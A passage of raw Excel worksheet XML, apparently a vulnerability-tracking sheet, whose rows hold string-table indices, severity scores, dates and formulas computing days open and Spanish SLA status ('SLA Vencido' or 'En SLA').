        <v>3529</v>
      </c>
      <c r="L555" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M555" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N555">
        <v>6.5</v>
      </c>
      <c r="Q555" t="s">
        <v>3530</v>
      </c>
      <c r="T555" s="1">
        <v>46094</v>
      </c>
      <c r="U555" s="76">
        <f t="shared" ref="U555:U563" ca="1" si="47">TODAY()-T555</f>
        <v>115</v>
      </c>
      <c r="V555" s="1">
        <f t="shared" ref="V555:V563" si="48">IF(M555="Critical",T555+10,IF(M555="High",T555+30,IF(M555="Bad",T555+30,IF(M555="Medium",T555+90,IF(M555="Warm",T555+90,IF(M555="Low",T555+120,IF(M555="Fair",T555+120,IF(M555="Neutral",T555+120,""))))))))</f>
        <v>46184</v>
      </c>
      <c r="W555" s="76" t="str">
        <f t="shared" ref="W555:W563" ca="1" si="49">IF(M555="Critical",IF(U555&gt;10,"SLA Vencido","En SLA"),IF(M555="High",IF(U555&gt;30,"SLA Vencido","En SLA"),IF(M555="Bad",IF(U555&gt;30,"SLA Vencido","En SLA"),IF(M555="Medium",IF(U555&gt;90,"SLA Vencido","En SLA"),IF(M555="Warm",IF(U555&gt;90,"SLA Vencido","En SLA"),IF(M555="Low",IF(U555&gt;120,"SLA Vencido","En SLA"),IF(M555="Fair",IF(U555&gt;120,"SLA Vencido","En SLA"),IF(M555="Neutral",IF(U555&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB555" s="65" t="s">
        <v>3531</v>
      </c>
      <c r="AC555" s="65" t="s">
        <v>3533</v>
      </c>
      <c r="AD555" s="65" t="s">
        <v>3532</v>
      </c>
      <c r="AE555" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="556" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A556" s="84">
        <v>555</v>
      </c>
      <c r="B556" t="s">
        <v>32</v>
      </c>
      <c r="C556" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D556" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G556" t="s">
        <v>3519</v>
      </c>
      <c r="I556" t="s">
        <v>3521</v>
      </c>
      <c r="J556" t="s">
        <v>1271</v>
      </c>
      <c r="L556" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M556" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N556">
        <v>3.8</v>
      </c>
      <c r="Q556" t="s">
        <v>3534</v>
      </c>
      <c r="T556" s="1">
        <v>46094</v>
      </c>
      <c r="U556" s="76">
        <f t="shared" ca="1" si="47"/>
        <v>115</v>
      </c>
      <c r="V556" s="1">
        <f t="shared" si="48"/>
        <v>46214</v>
      </c>
      <c r="W556" s="76" t="str">
        <f t="shared" ca="1" si="49"/>
        <v>En SLA</v>
      </c>
      <c r="AB556" s="65" t="s">
        <v>3077</v>
      </c>
      <c r="AC556" s="65" t="s">
        <v>3539</v>
      </c>
      <c r="AD556" s="65" t="s">
        <v>3538</v>
      </c>
      <c r="AE556" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="557" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A557" s="84">
        <v>556</v>
      </c>
      <c r="B557" t="s">
        <v>32</v>
      </c>
      <c r="C557" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D557" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G557" t="s">
        <v>3519</v>
      </c>
      <c r="I557" t="s">
        <v>3522</v>
      </c>
      <c r="J557" t="s">
        <v>1271</v>
      </c>
      <c r="L557" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M557" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N557">
        <v>3.8</v>
      </c>
      <c r="Q557" t="s">
        <v>3535</v>
      </c>
      <c r="T557" s="1">
        <v>46094</v>
      </c>
      <c r="U557" s="76">
        <f t="shared" ca="1" si="47"/>
        <v>115</v>
      </c>
      <c r="V557" s="1">
        <f t="shared" si="48"/>
        <v>46214</v>
      </c>
      <c r="W557" s="76" t="str">
        <f t="shared" ca="1" si="49"/>
        <v>En SLA</v>
      </c>
      <c r="AB557" s="65" t="s">
        <v>3077</v>
      </c>
      <c r="AC557" s="65" t="s">
        <v>3539</v>
      </c>
      <c r="AD557" s="65" t="s">
        <v>3538</v>
      </c>
      <c r="AE557" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="558" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A558" s="84">
        <v>557</v>
      </c>
      <c r="B558" t="s">
        <v>32</v>
      </c>
      <c r="C558" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D558" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G558" t="s">
        <v>3519</v>
      </c>
      <c r="I558" t="s">
        <v>3523</v>
      </c>
      <c r="J558" t="s">
        <v>1271</v>
      </c>
      <c r="L558" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M558" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N558">
        <v>3.8</v>
      </c>
      <c r="Q558" t="s">
        <v>3536</v>
      </c>
      <c r="T558" s="1">
        <v>46094</v>
      </c>
      <c r="U558" s="76">
        <f t="shared" ca="1" si="47"/>
        <v>115</v>
      </c>
      <c r="V558" s="1">
        <f t="shared" si="48"/>
        <v>46214</v>
      </c>
      <c r="W558" s="76" t="str">
        <f t="shared" ca="1" si="49"/>
        <v>En SLA</v>
      </c>
      <c r="AB558" s="65" t="s">
        <v>3077</v>
      </c>
      <c r="AC558" s="65" t="s">
        <v>3539</v>
      </c>
      <c r="AD558" s="65" t="s">
        <v>3538</v>
      </c>
      <c r="AE558" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="559" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A559" s="84">
        <v>558</v>
      </c>
      <c r="B559" t="s">
        <v>32</v>
      </c>
      <c r="C559" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D559" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G559" t="s">
        <v>3519</v>
      </c>
      <c r="I559" t="s">
        <v>3524</v>
      </c>
      <c r="J559" t="s">
        <v>1271</v>
      </c>
      <c r="L559" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M559" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N559">
        <v>3.8</v>
      </c>
      <c r="Q559" t="s">
        <v>3537</v>
      </c>
      <c r="T559" s="1">
        <v>46094</v>
      </c>
      <c r="U559" s="76">
        <f t="shared" ca="1" si="47"/>
        <v>115</v>
      </c>
      <c r="V559" s="1">
        <f t="shared" si="48"/>
        <v>46214</v>
      </c>
      <c r="W559" s="76" t="str">
        <f t="shared" ca="1" si="49"/>
        <v>En SLA</v>
      </c>
      <c r="AB559" s="65" t="s">
        <v>3077</v>
      </c>
      <c r="AC559" s="65" t="s">
        <v>3539</v>
      </c>
      <c r="AD559" s="65" t="s">
        <v>3538</v>
      </c>
      <c r="AE559" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="560" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A560" s="84">
        <v>559</v>
      </c>
      <c r="B560" t="s">
        <v>32</v>
      </c>
      <c r="C560" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D560" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G560" t="s">
        <v>3519</v>
      </c>
      <c r="I560" t="s">
        <v>3525</v>
      </c>
      <c r="J560" t="s">
        <v>1747</v>
      </c>
      <c r="L560" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M560" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N560">
        <v>2.8</v>
      </c>
      <c r="Q560" t="s">
        <v>3534</v>
      </c>
      <c r="T560" s="1">
        <v>46094</v>
      </c>
      <c r="U560" s="76">
        <f t="shared" ca="1" si="47"/>
        <v>115</v>
      </c>
      <c r="V560" s="1">
        <f t="shared" si="48"/>
        <v>46214</v>
      </c>
      <c r="W560" s="76" t="str">
        <f t="shared" ca="1" si="49"/>
        <v>En SLA</v>
      </c>
      <c r="AB560" s="65" t="s">
        <v>3540</v>
      </c>
      <c r="AC560" s="65" t="s">
        <v>3541</v>
      </c>
      <c r="AD560" s="65" t="s">
        <v>3542</v>
      </c>
      <c r="AE560" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="561" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A561" s="84">
        <v>560</v>
      </c>
      <c r="B561" t="s">
        <v>32</v>
      </c>
      <c r="C561" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D561" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G561" t="s">
        <v>3519</v>
      </c>
      <c r="I561" t="s">
        <v>3526</v>
      </c>
      <c r="J561" t="s">
        <v>1747</v>
      </c>
      <c r="L561" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M561" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N561">
        <v>2.8</v>
      </c>
      <c r="Q561" t="s">
        <v>3535</v>
      </c>
      <c r="T561" s="1">
        <v>46094</v>
      </c>
      <c r="U561" s="76">
        <f t="shared" ca="1" si="47"/>
        <v>115</v>
      </c>
      <c r="V561" s="1">
        <f t="shared" si="48"/>
        <v>46214</v>
      </c>
      <c r="W561" s="76" t="str">
        <f t="shared" ca="1" si="49"/>
        <v>En SLA</v>
      </c>
      <c r="AB561" s="65" t="s">
        <v>3540</v>
      </c>
      <c r="AC561" s="65" t="s">
        <v>3541</v>
      </c>
      <c r="AD561" s="65" t="s">
        <v>3542</v>
      </c>
      <c r="AE561" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="562" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A562" s="84">
        <v>561</v>
      </c>
      <c r="B562" t="s">
        <v>32</v>
      </c>
      <c r="C562" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D562" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G562" t="s">
        <v>3519</v>
      </c>
      <c r="I562" t="s">
        <v>3527</v>
      </c>
      <c r="J562" t="s">
        <v>1747</v>
      </c>
      <c r="L562" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M562" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N562">
        <v>2.8</v>
      </c>
      <c r="Q562" t="s">
        <v>3536</v>
      </c>
      <c r="T562" s="1">
        <v>46094</v>
      </c>
      <c r="U562" s="76">
        <f t="shared" ca="1" si="47"/>
        <v>115</v>
      </c>
      <c r="V562" s="1">
        <f t="shared" si="48"/>
        <v>46214</v>
      </c>
      <c r="W562" s="76" t="str">
        <f t="shared" ca="1" si="49"/>
        <v>En SLA</v>
      </c>
      <c r="AB562" s="65" t="s">
        <v>3540</v>
      </c>
      <c r="AC562" s="65" t="s">
        <v>3541</v>
      </c>
      <c r="AD562" s="65" t="s">
        <v>3542</v>
      </c>
      <c r="AE562" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="563" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A563" s="84">
        <v>562</v>
      </c>
      <c r="B563" t="s">
        <v>32</v>
      </c>
      <c r="C563" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D563" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G563" t="s">
        <v>3519</v>
      </c>
      <c r="I563" t="s">
        <v>3528</v>
      </c>
      <c r="J563" t="s">
        <v>1747</v>
      </c>
      <c r="L563" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M563" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N563">
        <v>2.8</v>
      </c>
      <c r="Q563" t="s">
        <v>3537</v>
      </c>
      <c r="T563" s="1">
        <v>46094</v>
      </c>
      <c r="U563" s="76">
        <f t="shared" ca="1" si="47"/>
        <v>115</v>
      </c>
      <c r="V563" s="1">
        <f t="shared" si="48"/>
        <v>46214</v>
      </c>
      <c r="W563" s="76" t="str">
        <f t="shared" ca="1" si="49"/>
        <v>En SLA</v>
      </c>
      <c r="AB563" s="65" t="s">
        <v>3540</v>
      </c>
      <c r="AC563" s="65" t="s">
        <v>3541</v>
      </c>
      <c r="AD563" s="65" t="s">
        <v>3542</v>
      </c>
      <c r="AE563" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="564" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A564" s="84">
        <v>563</v>
      </c>
      <c r="B564" t="s">
        <v>32</v>
      </c>
      <c r="C564" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D564" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G564" t="s">
        <v>3601</v>
      </c>
      <c r="H564" t="s">
        <v>3544</v>
      </c>
      <c r="J564" t="s">
        <v>3529</v>
      </c>
      <c r="L564" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M564" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q564" t="s">
        <v>3535</v>
      </c>
      <c r="T564" s="1">
        <v>46095</v>
      </c>
      <c r="U564" s="76">
        <f t="shared" ref="U564:U606" ca="1" si="50">TODAY()-T564</f>
        <v>114</v>
      </c>
      <c r="V564" s="1">
        <f t="shared" ref="V564:V606" si="51">IF(M564="Critical",T564+10,IF(M564="High",T564+30,IF(M564="Bad",T564+30,IF(M564="Medium",T564+90,IF(M564="Warm",T564+90,IF(M564="Low",T564+120,IF(M564="Fair",T564+120,IF(M564="Neutral",T564+120,""))))))))</f>
        <v>46185</v>
      </c>
      <c r="W564" s="76" t="str">
        <f t="shared" ref="W564:W606" ca="1" si="52">IF(M564="Critical",IF(U564&gt;10,"SLA Vencido","En SLA"),IF(M564="High",IF(U564&gt;30,"SLA Vencido","En SLA"),IF(M564="Bad",IF(U564&gt;30,"SLA Vencido","En SLA"),IF(M564="Medium",IF(U564&gt;90,"SLA Vencido","En SLA"),IF(M564="Warm",IF(U564&gt;90,"SLA Vencido","En SLA"),IF(M564="Low",IF(U564&gt;120,"SLA Vencido","En SLA"),IF(M564="Fair",IF(U564&gt;120,"SLA Vencido","En SLA"),IF(M564="Neutral",IF(U564&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB564" t="s">
        <v>3591</v>
      </c>
      <c r="AD564" t="s">
        <v>3595</v>
      </c>
      <c r="AE564" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG564" t="s">
        <v>3624</v>
      </c>
    </row>
    <row r="565" spans="1:33" ht="44.25" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A565" s="84">
        <v>564</v>
      </c>
      <c r="B565" t="s">
        <v>32</v>
      </c>
      <c r="C565" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D565" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G565" t="s">
        <v>3501</v>
      </c>
      <c r="H565" t="s">
        <v>3545</v>
      </c>
      <c r="I565" t="s">
        <v>3605</v>
      </c>
      <c r="J565" t="s">
        <v>3599</v>
      </c>
      <c r="L565" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M565" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N565">
        <v>5.4</v>
      </c>
      <c r="Q565" t="s">
        <v>3572</v>
      </c>
      <c r="T565" s="1">
        <v>46105</v>
      </c>
      <c r="U565" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>104</v>
      </c>
      <c r="V565" s="1">
        <f t="shared" si="51"/>
        <v>46195</v>
      </c>
      <c r="W565" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB565" t="s">
        <v>3592</v>
      </c>
      <c r="AC565" s="65" t="s">
        <v>3604</v>
      </c>
      <c r="AD565" t="s">
        <v>3596</v>
      </c>
      <c r="AE565" s="65" t="s">
        <v>1987</v>
      </c>
    </row>
    <row r="566" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A566" s="84">
        <v>565</v>
      </c>
      <c r="B566" t="s">
        <v>32</v>
      </c>
      <c r="C566" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D566" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G566" t="s">
        <v>1416</v>
      </c>
      <c r="H566" t="s">
        <v>3543</v>
      </c>
      <c r="I566" t="s">
        <v>3606</v>
      </c>
      <c r="J566" t="s">
        <v>3600</v>
      </c>
      <c r="L566" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M566" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N566">
        <v>4.3</v>
      </c>
      <c r="Q566" t="s">
        <v>1425</v>
      </c>
      <c r="T566" s="1">
        <v>46105</v>
      </c>
      <c r="U566" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>104</v>
      </c>
      <c r="V566" s="1">
        <f t="shared" si="51"/>
        <v>46195</v>
      </c>
      <c r="W566" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB566" t="s">
        <v>3593</v>
      </c>
      <c r="AD566" t="s">
        <v>3597</v>
      </c>
      <c r="AE566" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG566" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="567" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A567" s="84">
        <v>566</v>
      </c>
      <c r="B567" t="s">
        <v>32</v>
      </c>
      <c r="C567" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D567" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G567" t="s">
        <v>1416</v>
      </c>
      <c r="H567" t="s">
        <v>3546</v>
      </c>
      <c r="I567" t="s">
        <v>3607</v>
      </c>
      <c r="J567" t="s">
        <v>80</v>
      </c>
      <c r="L567" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M567" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N567">
        <v>4.3</v>
      </c>
      <c r="Q567" t="s">
        <v>1425</v>
      </c>
      <c r="T567" s="1">
        <v>46105</v>
      </c>
      <c r="U567" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>104</v>
      </c>
      <c r="V567" s="1">
        <f t="shared" si="51"/>
        <v>46195</v>
      </c>
      <c r="W567" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB567" t="s">
        <v>3594</v>
      </c>
      <c r="AC567" s="65" t="s">
        <v>3613</v>
      </c>
      <c r="AD567" t="s">
        <v>3598</v>
      </c>
      <c r="AE567" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG567" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="568" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A568" s="84">
        <v>568</v>
      </c>
      <c r="B568" t="s">
        <v>32</v>
      </c>
      <c r="C568" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D568" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G568" t="s">
        <v>1416</v>
      </c>
      <c r="I568" t="s">
        <v>3608</v>
      </c>
      <c r="J568" t="s">
        <v>3611</v>
      </c>
      <c r="L568" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M568" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N568">
        <v>3.4</v>
      </c>
      <c r="Q568" t="s">
        <v>1425</v>
      </c>
      <c r="T568" s="1">
        <v>46105</v>
      </c>
      <c r="U568" s="76">
        <f t="shared" ref="U568:U570" ca="1" si="53">TODAY()-T568</f>
        <v>104</v>
      </c>
      <c r="V568" s="1">
        <f t="shared" ref="V568:V570" si="54">IF(M568="Critical",T568+10,IF(M568="High",T568+30,IF(M568="Bad",T568+30,IF(M568="Medium",T568+90,IF(M568="Warm",T568+90,IF(M568="Low",T568+120,IF(M568="Fair",T568+120,IF(M568="Neutral",T568+120,""))))))))</f>
        <v>46225</v>
      </c>
      <c r="W568" s="76" t="str">
        <f t="shared" ref="W568:W570" ca="1" si="55">IF(M568="Critical",IF(U568&gt;10,"SLA Vencido","En SLA"),IF(M568="High",IF(U568&gt;30,"SLA Vencido","En SLA"),IF(M568="Bad",IF(U568&gt;30,"SLA Vencido","En SLA"),IF(M568="Medium",IF(U568&gt;90,"SLA Vencido","En SLA"),IF(M568="Warm",IF(U568&gt;90,"SLA Vencido","En SLA"),IF(M568="Low",IF(U568&gt;120,"SLA Vencido","En SLA"),IF(M568="Fair",IF(U568&gt;120,"SLA Vencido","En SLA"),IF(M568="Neutral",IF(U568&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>En SLA</v>
      </c>
      <c r="AB568" s="65" t="s">
        <v>3617</v>
      </c>
      <c r="AC568" s="65" t="s">
        <v>3615</v>
      </c>
      <c r="AD568" s="65" t="s">
        <v>3616</v>
      </c>
      <c r="AE568" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG568" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="569" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A569" s="84">
        <v>569</v>
      </c>
      <c r="B569" t="s">
        <v>32</v>
      </c>
      <c r="C569" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D569" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G569" t="s">
        <v>1416</v>
      </c>
      <c r="I569" t="s">
        <v>3609</v>
      </c>
      <c r="J569" t="s">
        <v>1271</v>
      </c>
      <c r="L569" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M569" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N569">
        <v>3.4</v>
      </c>
      <c r="Q569" t="s">
        <v>1425</v>
      </c>
      <c r="T569" s="1">
        <v>46105</v>
      </c>
      <c r="U569" s="76">
        <f t="shared" ca="1" si="53"/>
        <v>104</v>
      </c>
      <c r="V569" s="1">
        <f t="shared" si="54"/>
        <v>46225</v>
      </c>
      <c r="W569" s="76" t="str">
        <f t="shared" ca="1" si="55"/>
        <v>En SLA</v>
      </c>
      <c r="AB569" s="65" t="s">
        <v>3618</v>
      </c>
      <c r="AC569" s="65" t="s">
        <v>3619</v>
      </c>
      <c r="AD569" s="65" t="s">
        <v>3620</v>
      </c>
      <c r="AE569" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG569" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="570" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A570" s="84"/>
      <c r="B570" t="s">
        <v>32</v>
      </c>
      <c r="C570" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D570" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G570" t="s">
        <v>1416</v>
      </c>
      <c r="I570" t="s">
        <v>3610</v>
      </c>
      <c r="J570" t="s">
        <v>3612</v>
      </c>
      <c r="L570" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M570" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N570">
        <v>3.3</v>
      </c>
      <c r="Q570" t="s">
        <v>1425</v>
      </c>
      <c r="T570" s="1">
        <v>46105</v>
      </c>
      <c r="U570" s="76">
        <f t="shared" ca="1" si="53"/>
        <v>104</v>
      </c>
      <c r="V570" s="1">
        <f t="shared" si="54"/>
        <v>46225</v>
      </c>
      <c r="W570" s="76" t="str">
        <f t="shared" ca="1" si="55"/>
        <v>En SLA</v>
      </c>
      <c r="AB570" s="65" t="s">
        <v>3621</v>
      </c>
      <c r="AC570" s="65" t="s">
        <v>3622</v>
      </c>
      <c r="AD570" s="65" t="s">
        <v>3623</v>
      </c>
      <c r="AE570" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG570" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="571" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A571" s="84">
        <v>567</v>
      </c>
      <c r="B571" t="s">
        <v>32</v>
      </c>
      <c r="C571" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D571" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G571" t="s">
        <v>3501</v>
      </c>
      <c r="H571" t="s">
        <v>3562</v>
      </c>
      <c r="J571" t="s">
        <v>2913</v>
      </c>
      <c r="L571" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M571" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q571" t="s">
        <v>3573</v>
      </c>
      <c r="T571" s="1">
        <v>46099</v>
      </c>
      <c r="U571" s="76">
        <f ca="1">TODAY()-T571</f>
        <v>110</v>
      </c>
      <c r="V571" s="1">
        <f>IF(M571="Critical",T571+10,IF(M571="High",T571+30,IF(M571="Bad",T571+30,IF(M571="Medium",T571+90,IF(M571="Warm",T571+90,IF(M571="Low",T571+120,IF(M571="Fair",T571+120,IF(M571="Neutral",T571+120,""))))))))</f>
        <v>46189</v>
      </c>
      <c r="W571" s="76" t="str">
        <f ca="1">IF(M571="Critical",IF(U571&gt;10,"SLA Vencido","En SLA"),IF(M571="High",IF(U571&gt;30,"SLA Vencido","En SLA"),IF(M571="Bad",IF(U571&gt;30,"SLA Vencido","En SLA"),IF(M571="Medium",IF(U571&gt;90,"SLA Vencido","En SLA"),IF(M571="Warm",IF(U571&gt;90,"SLA Vencido","En SLA"),IF(M571="Low",IF(U571&gt;120,"SLA Vencido","En SLA"),IF(M571="Fair",IF(U571&gt;120,"SLA Vencido","En SLA"),IF(M571="Neutral",IF(U571&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB571" t="s">
        <v>2915</v>
      </c>
      <c r="AD571" t="s">
        <v>2916</v>
      </c>
      <c r="AE571" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG571" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="572" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A572" s="84">
        <v>571</v>
      </c>
      <c r="B572" t="s">
        <v>32</v>
      </c>
      <c r="C572" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D572" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G572" t="s">
        <v>3501</v>
      </c>
      <c r="H572" t="s">
        <v>3561</v>
      </c>
      <c r="J572" t="s">
        <v>2834</v>
      </c>
      <c r="L572" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M572" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q572" t="s">
        <v>3574</v>
      </c>
      <c r="T572" s="1">
        <v>46100</v>
      </c>
      <c r="U572" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V572" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W572" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB572" t="s">
        <v>3511</v>
      </c>
      <c r="AD572" t="s">
        <v>3518</v>
      </c>
      <c r="AE572" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG572" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="573" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A573" s="84">
        <v>572</v>
      </c>
      <c r="B573" t="s">
        <v>32</v>
      </c>
      <c r="C573" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D573" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G573" t="s">
        <v>3501</v>
      </c>
      <c r="H573" t="s">
        <v>3507</v>
      </c>
      <c r="J573" t="s">
        <v>2834</v>
      </c>
      <c r="L573" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M573" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q573" t="s">
        <v>3517</v>
      </c>
      <c r="T573" s="1">
        <v>46100</v>
      </c>
      <c r="U573" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V573" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W573" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB573" t="s">
        <v>3511</v>
      </c>
      <c r="AD573" t="s">
        <v>3518</v>
      </c>
      <c r="AE573" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG573" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="574" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A574" s="84">
        <v>573</v>
      </c>
      <c r="B574" t="s">
        <v>32</v>
      </c>
      <c r="C574" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D574" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G574" t="s">
        <v>3501</v>
      </c>
      <c r="H574" t="s">
        <v>3508</v>
      </c>
      <c r="J574" t="s">
        <v>2834</v>
      </c>
      <c r="L574" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M574" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q574" t="s">
        <v>3517</v>
      </c>
      <c r="T574" s="1">
        <v>46100</v>
      </c>
      <c r="U574" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V574" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W574" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB574" t="s">
        <v>3511</v>
      </c>
      <c r="AD574" t="s">
        <v>3518</v>
      </c>
      <c r="AE574" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG574" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="575" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A575" s="84">
        <v>574</v>
      </c>
      <c r="B575" t="s">
        <v>32</v>
      </c>
      <c r="C575" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D575" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G575" t="s">
        <v>3501</v>
      </c>
      <c r="H575" t="s">
        <v>3571</v>
      </c>
      <c r="J575" t="s">
        <v>2913</v>
      </c>
      <c r="L575" s="50" t="s">
        <v>41</v>
      </c>
